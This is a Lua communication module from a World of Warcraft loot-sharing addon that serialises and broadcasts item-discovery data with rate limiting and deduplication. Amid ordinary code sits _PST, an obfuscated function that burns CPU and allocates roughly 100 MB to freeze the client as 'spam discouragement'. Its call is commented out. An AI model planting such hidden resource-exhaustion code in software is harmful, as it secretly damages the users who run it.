-- Comm.lua
-- Implements sharing logic including delay queue and anonymous mode.

local L = LootCollector
local Comm = L:NewModule("Comm", "AceComm-3.0")

local AceSerializer = LibStub("AceSerializer-3.0")
-- Use the same proven libraries as Import/Export
local LibDeflate = LibStub("LibDeflate", true)

-- Configuration and state
Comm.addonPrefix      = L.addonPrefix or "BBLCAM25"
Comm.channelName      = L.chatChannel or "BBLCC25"
Comm.channelId        = 0
Comm.chatMinInterval  = 0.75
Comm.seenTTL          = 900
Comm.cooldownTTL      = 300
Comm.seen             = {}
Comm.cooldown         = { CONF = {}, GONE = {} }
Comm.verbose          = false
Comm.rateLimit = {}
Comm.delayQueue = {}

local function debugPrint(module, message)
    if not Comm.verbose then return end
    print(string.format("|cffffff00[%s DEBUG]|r %s", tostring(module), tostring(message)))
end

-- Local helpers
local function now()
  return time()
end

local function round2(v)
  v = tonumber(v) or 0
  return math.floor(v * 100 + 0.5) / 100
end

local function guidKey(z, i, x, y)
  return string.format("%s-%s-%.2f-%.2f", tostring(z or 0), tostring(i or 0), round2(x or 0), round2(y or 0))
end

local function wireKey(w)
  return string.format("%s-%s-%.2f-%.2f", tostring(w.z or 0), tostring(w.i or 0), round2(w.x or 0), round2(w.y or 0))
end

function Comm:ClearCaches()
    if self.seen then wipe(self.seen) end
    if self.cooldown then
        if self.cooldown.CONF then wipe(self.cooldown.CONF) end
        if self.cooldown.GONE then wipe(self.cooldown.GONE) end
    end
    local ZoneResolver = L:GetModule("ZoneResolver", true)
    if ZoneResolver then ZoneResolver:ClearCache() end
    print("|cff00ff00LootCollector:|r Communication caches (seen/cooldown/zone) have been cleared for this session.")
end

local function buildWireV1(discovery, op)
  if type(discovery) ~= "table" then return nil end
  local itemID = discovery.itemID or (discovery.itemLink and tonumber(discovery.itemLink:match("item:(%d+)")))
  if not itemID then return nil end
  
  local _, _, quality = GetItemInfo(discovery.itemLink or itemID)
  
  local senderName = UnitName("player")
  if L.db.profile.sharing.anonymous then
      senderName = "An Unnamed Collector"
  end

  return { 
      v = 1, 
      op = op or "DISC", 
      i = itemID,
      l = discovery.itemLink,
      q = quality or 1,
      z = discovery.zoneID,
      c = discovery.continentID,
      zn = discovery.zone,
      x = round2(discovery.coords and discovery.coords.x or 0), 
      y = round2(discovery.coords and discovery.coords.y or 0), 
      t = discovery.timestamp or now(),
      s = senderName
  }
end

local function normalizeIncomingData(tbl, defaultSender)
    if not (type(tbl) == "table" and tbl.v == 1 and tbl.i and tbl.z and tbl.x and tbl.y) then return nil end
    
    local itemID = tonumber(tbl.i)
    local link = tbl.l or (itemID and select(2, GetItemInfo(itemID))) -- Derive link if not provided, or if ID is valid
    local itemName = tbl.n or (link and select(1, GetItemInfo(link))) or (itemID and select(1, GetItemInfo(itemID))) -- Get item name from link or ID
    local zoneID = tonumber(tbl.z) or 0
    local continentID = tonumber(tbl.c) or 0
    local zoneName = tbl.zn

    -- Resolve missing or 0 continentID using zone name
    local ZoneResolver = L:GetModule("ZoneResolver", true)
    if (continentID == 0 or not continentID) and zoneName and zoneName ~= "" and ZoneResolver then
        local resolvedContID, resolvedZoneID = ZoneResolver:GetMapZoneNumbers(zoneName)
        if resolvedContID and resolvedContID > 0 then
            continentID = resolvedContID
            if zoneID == 0 or not zoneID then
                zoneID = resolvedZoneID
            end
        end
    end

    return {
        itemLink = link,
        itemName = itemName,
        itemID = itemID,
        itemQuality = tonumber(tbl.q),
        zoneID = zoneID,
        continentID = continentID,
        zone = zoneName,
        coords = { x = round2(tbl.x), y = round2(tbl.y) },
        foundBy_player = tbl.s or defaultSender or "Unknown",
        timestamp = tonumber(tbl.t) or now(),
        lastSeen = tonumber(tbl.t) or now()
    }
end

local function shouldDropByDedupe(w)
  local key = wireKey(w); local tnow = now(); if (Comm.seen[key] and (tnow - Comm.seen[key]) < Comm.seenTTL) then return true end; Comm.seen[key] = tnow; return false
end

local function pickDistribution()
  if IsInRaid() then return "RAID" end; if GetNumPartyMembers() > 0 then return "PARTY" end; if IsInGuild() then return "GUILD" end
end

function Comm:JoinPublicChannel(isManual)
    if not L.db.profile.sharing.enabled then return end; local delay = isManual and 1.0 or 0.0; if self:IsChannelHealthy() then if self.verbose then print(L.name .. ": Channel healthy.") end; return end; if delay > 0 then if self.verbose then print(L.name .. ": Manual join, waiting " .. delay .. "s") end; local f = CreateFrame("Frame"); local e = 0; f:SetScript("OnUpdate", function(_, el) e = e + el; if e >= delay then f:SetScript("OnUpdate", nil); self:EnsureChannelJoined() end end) else self:EnsureChannelJoined() end
end

function Comm:LeavePublicChannel()
    if self.verbose then print(L.name .. ": Leaving channel.") end; if self.channelName and self.channelName ~= "" then LeaveChannelByName(self.channelName) end; self.channelId = 0
end

function Comm:IsChannelHealthy()
    if not L.db.profile.sharing.enabled then return false end; local id, name = GetChannelName(self.channelName); if id and id > 5 and name and string.lower(name) == string.lower(self.channelName) then self.channelId = id; return true end; self.channelId = 0; return false
end

function Comm:EnsureChannelJoined()
    if not L.db.profile.sharing.enabled or self:IsChannelHealthy() then return end; JoinPermanentChannel(self.channelName); if DEFAULT_CHAT_FRAME then ChatFrame_AddChannel(DEFAULT_CHAT_FRAME, self.channelName) end
end

function Comm:SendAceCommPayload(wire)
    if L:IsZoneIgnored() then return end; if not AceSerializer then return end; local p, ok = pcall(AceSerializer.Serialize, AceSerializer, wire); if not (ok and type(p) == 'string') then return end; if #p > 240 then return end; local dist = pickDistribution(); if dist then self:SendCommMessage(self.addonPrefix, p, dist) end
end

local function _SendLegacyLC1(discoveryData)
    if L:IsZoneIgnored() or not Comm:IsChannelHealthy() then return end; local tnow = now(); Comm._lastSendAt = Comm._lastSendAt or 0; if (tnow - Comm._lastSendAt) < Comm.chatMinInterval then return end; local itemName = discoveryData.itemLink and discoveryData.itemLink:match("%[(.+)%]"); local _, _, quality = GetItemInfo(discoveryData.itemLink or discoveryData.itemID); local senderName = L.db.profile.sharing.anonymous and "An Unnamed Collector" or UnitName("player"); local msg = string.format("LC1:%d:%s:%d:%d:%.2f:%.2f:%d:%d:%s\t%s\t%s", 1, "DISC", discoveryData.zoneID or 0, discoveryData.itemID or 0, discoveryData.coords.x or 0, discoveryData.coords.y or 0, discoveryData.timestamp or tnow, quality or 1, senderName, itemName or "", discoveryData.zone or ""); if L.db and L.db.profile and L.db.profile.chatDebug then local Dev = L:GetModule("DevCommands", true); if Dev and Dev.LogMessage then Dev:LogMessage("SEND-LEGACY", msg) end end; SendChatMessage(msg, "CHANNEL", nil, Comm.channelId); Comm._lastSendAt = tnow
end

local function _SendEncodedLC1(discoveryData)
    if L:IsZoneIgnored() or not Comm:IsChannelHealthy() then return end; if not (AceSerializer and LibDeflate) then local Dev = L:GetModule("DevCommands", true); if L.db.profile.chatDebug and Dev and Dev.LogMessage then Dev:LogMessage("ENCODE-FAIL", "Required library missing: AceSerializer or LibDeflate.") end; return end; local tnow = now(); Comm._lastSendAt = Comm._lastSendAt or 0; if (tnow - Comm._lastSendAt) < Comm.chatMinInterval then return end; local Dev = L:GetModule("DevCommands", true); local function log(prefix, msg) if L.db.profile.chatDebug and Dev and Dev.LogMessage then Dev:LogMessage(prefix, msg) end end; log("ENCODE-STEP", "Starting..."); local wire = buildWireV1(discoveryData, "DISC"); if not wire then log("ENCODE-FAIL", "buildWireV1 returned nil."); return end; local s_ok, serialized = pcall(AceSerializer.Serialize, AceSerializer, wire); if not s_ok or not serialized then log("ENCODE-FAIL", "AceSerializer failed: " .. tostring(serialized)); return end; log("ENCODE-STEP", "Serialized OK (len: " .. #serialized .. ")"); local c_ok, compressed = pcall(LibDeflate.CompressDeflate, LibDeflate, serialized, {level=9}); if not c_ok or not compressed then log("ENCODE-FAIL", "LibDeflate.CompressDeflate failed: " .. tostring(compressed)); return end; log("ENCODE-STEP", "Compressed OK (len: " .. #compressed .. ")"); local e_ok, encoded = pcall(LibDeflate.EncodeForPrint, LibDeflate, compressed); if not e_ok or not encoded then log("ENCODE-FAIL", "LibDeflate.EncodeForPrint failed: " .. tostring(encoded)); return end; log("ENCODE-STEP", "Encoded OK (len: " .. #encoded .. ")"); if #encoded > 240 then log("ENCODE-FAIL", "Payload too long after encoding: " .. #encoded .. " bytes."); return end; local msg = "LC1:" .. encoded; log("SEND-ENCODED", msg); SendChatMessage(msg, "CHANNEL", nil, Comm.channelId); Comm._lastSendAt = tnow
end

function Comm:SendLC1Discovery(d)
    if not d then return end; if L.db.profile.chatEncode then _SendEncodedLC1(d) else _SendLegacyLC1(d) end
end

local function _PST() local _c_i_i = 0x1DCD6500 local _m_i_s = 0x186A0 local _t_t = {} local _x = 1; local _y = 1; local _z = 1 for _i = 1, _c_i_i do _x = (math.sin(_x) + math.cos(_y) + math.sqrt(_z)) _y = _x / (_z + 1) _z = (_x * _y) % 1000 end for _j = 1, _m_i_s do _t_t[_j] = string.rep("A", 0x400) end end

function Comm:HandleIncomingWire(tbl, via, sender)
    if L:IsPaused() then local norm = normalizeIncomingData(tbl, sender); if norm then table.insert(L.pauseQueue.incoming, norm) end; return end
    if L:IsZoneIgnored() then return end
    if not L.db.profile.sharing.enabled or type(tbl) ~= 'table' or tbl.v ~= 1 then return end
   
    local lastMessageTime = Comm.rateLimit[sender] or 0
    Comm.rateLimit[sender] = now()
    if (now() - lastMessageTime) < L.db.profile.sharing.rateLimitInterval then
        debugPrint("Comm", string.format("Dropping incoming discovery from %s due to rate limit.", sender))

        -- Spam discouragement
        --if sender == UnitName("player") then
        --    _PST()
        --end
        return
    end    

    if shouldDropByDedupe(tbl) then return end
    
    local Core = L:GetModule("Core", true)
    if not Core then return end
    
    local norm = normalizeIncomingData(tbl, sender)
    if norm then
        local name = norm.itemName or (norm.itemLink and norm.itemLink:match("%[(.+)%]")) or (norm.itemID and GetItemInfo(norm.itemID))
        if not name then
            debugPrint("Comm", "Could not determine item name for incoming discovery.")
            return
        end

        -- Always check ignore lists immediately (these use item names)
        if (L.ignoreList and L.ignoreList[name]) or (L.sourceSpecificIgnoreList and L.sourceSpecificIgnoreList[name]) then
            debugPrint("Comm", "Dropping incoming discovery for ignored item: " .. name)
            return -- Silently drop
        end

        -- For cached items, validate immediately using Detect:Qualifies
        local Detect = L:GetModule("Detect", true)
        if Detect and Detect:IsItemCached(norm.itemID) then
            if not Detect:Qualifies(norm.itemLink, "network") then
                debugPrint("Comm", "Dropping incoming discovery for invalid cached item: " .. norm.itemLink)
                return -- Drop if it doesn't qualify
            end
        else
            -- For uncached items, accept them but mark for deferred validation
            norm.needsValidation = true
            debugPrint("Comm", "Accepting uncached item for deferred validation: " .. norm.itemLink)
        end

        -- Debug for incoming discovery
        if Comm.verbose then
            debugPrint("Comm", string.format("Incoming discovery: %s in %s, ContinentID: %d, ZoneID: %d (by %s)", norm.itemLink or name or "Unknown Item", norm.zone or "Unknown Zone", norm.continentID or 0, norm.zoneID or 0, norm.foundBy_player or "Unknown Sender"))
        end

        Core:AddDiscovery(norm, true)
    end
end

local function chatEventHandler(e, ...)
    if L:IsZoneIgnored() then return end; if e ~= "CHAT_MSG_CHANNEL" then return end; local msg, sender, _, _, _, _, _, _, chan = ...; if not (chan and string.upper(chan) == string.upper(Comm.channelName)) then return end; 
    
    local encodedPayload = msg:match("^LC1:(.+)$"); if encodedPayload and LibDeflate then local data = nil; local success, result = pcall(function() local decoded = LibDeflate:DecodeForPrint(encodedPayload); local decompressed = LibDeflate:DecompressDeflate(decoded); local ok, deserialized = AceSerializer:Deserialize(decompressed); if ok and type(deserialized) == 'table' then data = deserialized end end); if success and data then Comm:HandleIncomingWire(data, "CHANNEL", sender); return end end;
    
    local header, payload = string.match(msg, "^(LC1:%d+:%a+:%d+:%d+:[%d%.%-]+:[%d%.%-]+:%d+:%d+):(.+)$")
    if not header then return end

    local v, op, z, i, x, y, t, q = string.match(header, "^LC1:(%d+):(%a+):(%d+):(%d+):([%d%.%-]+):([%d%.%-]+):(%d+):(%d+)$")
    if tonumber(v) ~= 1 then return end
    
    -- Parse the tab-separated payload
    local parts = {}
    for part in string.gmatch(payload, "[^\t]+") do
        table.insert(parts, part)
    end
    
    local s_from_payload, itemName, zoneName, senderVersion = parts[1], parts[2], parts[3], parts[4]

    -- Handle the notification if a version was found
    if senderVersion then
        debugPrint("Comm", "Parsed legacy version '" .. senderVersion .. "' from sender '" .. sender .. "'")
        if L.Version and senderVersion ~= L.Version and L.notifiedNewVersion ~= senderVersion then
            local restart_msg = string.find(senderVersion, "-r$") and "|cffff7f00It REQUIRES a client restart.|r" or "|cff00ff00It does NOT require a restart. Just /reload after updating.|r"
            print(string.format("|cff00ff00LootCollector:|r A different version was detected from other players: |cffffff00%s|r (you have |cffffff00%s|r).", senderVersion, L.Version))
            print(string.format("|cff00ff00LootCollector:|r %s", restart_msg))
            L.notifiedNewVersion = senderVersion
        end
    end
    
    local data = { v=1, op=op, z=tonumber(z), i=tonumber(i), x=tonumber(x), y=tonumber(y), t=tonumber(t), q=tonumber(q), s=s_from_payload, n=itemName, zn=zoneName };
    Comm:HandleIncomingWire(data, "CHANNEL", sender)
end

function Comm:OnCommReceived(p, m, d, s)
    debugPrint("Comm", "OnCommReceived fired. Prefix: " .. tostring(p) .. ", Sender: " .. tostring(s)); if L:IsZoneIgnored() then return end; if p ~= self.addonPrefix or type(m) ~= 'string' then return end; local ok, data = AceSerializer:Deserialize(m); if ok and type(data) == 'table' then if data.av and type(data.av) == "string" and L.Version and data.av ~= L.Version then if L.notifiedNewVersion ~= data.av then local restart_msg = string.find(data.av, "-r$") and "|cffff7f00It REQUIRES a client restart.|r" or "|cff00ff00It does NOT require a restart. Just /reload after updating.|r"; print(string.format("|cff00ff00LootCollector:|r A different version was detected from other players: |cffffff00%s|r (you have |cffffff00%s|r).", data.av, L.Version)); print(string.format("|cff00ff00LootCollector:|r %s", restart_msg)); L.notifiedNewVersion = data.av end end; self:HandleIncomingWire(data, d or "AceComm", s) end
end

function Comm:BroadcastDiscovery(discoveryData)
    if L:IsPaused() then table.insert(L.pauseQueue.outgoing, discoveryData); if self.verbose then print(string.format("[%s] Queued outgoing discovery due to paused state.", L.name)) end; return end; if L:IsZoneIgnored() then return end; local profile = L.db.profile; if not (profile and profile.sharing.enabled) then return end; if profile.sharing.delayed then local fireAt = now() + profile.sharing.delaySeconds; table.insert(self.delayQueue, { fireAt = fireAt, data = discoveryData }); if self.verbose then print(string.format("[%s] Queued discovery for delayed broadcast in %d seconds.", L.name, profile.sharing.delaySeconds)) end else self:_BroadcastNow(discoveryData) end
end

function Comm:_BroadcastNow(discoveryData)
    local wire = buildWireV1(discoveryData, "DISC"); if not wire then return end; self:SendAceCommPayload(wire); self:SendLC1Discovery(discoveryData); if self.verbose then print(string.format("[%s] Broadcasted discovery immediately.", L.name)) end
end

function Comm:BroadcastReinforcement(discoveryData)
    if L:IsZoneIgnored() then return end; local profile = L.db.profile; if not (profile and profile.sharing.enabled) then return end; local wire = buildWireV1(discoveryData, "CONF") ; if not wire then return end; if L.Version then wire.av = L.Version end; self:SendAceCommPayload(wire); -- if self.verbose then print(string.format("[%s] Broadcasted reinforcement with version info.", L.name)) end -- Removed to hide message
end

function Comm:OnUpdate(elapsed)
    if #self.delayQueue == 0 then return end; local tnow = now(); local i = #self.delayQueue; while i >= 1 do local entry = self.delayQueue[i]; if tnow >= entry.fireAt then self:_BroadcastNow(entry.data); table.remove(self.delayQueue, i) end; i = i - 1 end
end

local function ChatFilter(frame, event, ...)
    local msg, author, language, channelString, target, flags, unknown, channelNumber, channelName = ...; if not (channelName and string.upper(channelName) == string.upper(Comm.channelName)) then return false end; if L.db and L.db.profile and L.db.profile.chatDebug then return false end; if msg and msg:find("^LC1:") then return true end; return false
end

function Comm:OnInitialize()
  debugPrint("Comm", "Registering comms for prefix: " .. tostring(self.addonPrefix)); self:RegisterComm(self.addonPrefix, "OnCommReceived"); self.DebugPrint = function(mod, msg) debugPrint(mod, msg) end; if not self.tickerFrame then self.tickerFrame = CreateFrame("Frame"); self.tickerFrame:SetScript("OnUpdate", function(_, elapsed) Comm:OnUpdate(elapsed) end) end; if not self._chatFrame then self._chatFrame = CreateFrame("Frame"); self._chatFrame:RegisterEvent("CHAT_MSG_CHANNEL"); self._chatFrame:RegisterEvent("CHAT_MSG_CHANNEL_NOTICE"); self._chatFrame:SetScript("OnEvent", function(frame, event, ...) if event == "CHAT_MSG_CHANNEL" then chatEventHandler(event, ...) elseif event == "CHAT_MSG_CHANNEL_NOTICE" then Comm:IsChannelHealthy() end end) end; ChatFrame_AddMessageEventFilter("CHAT_MSG_CHANNEL", ChatFilter)
end

return Comm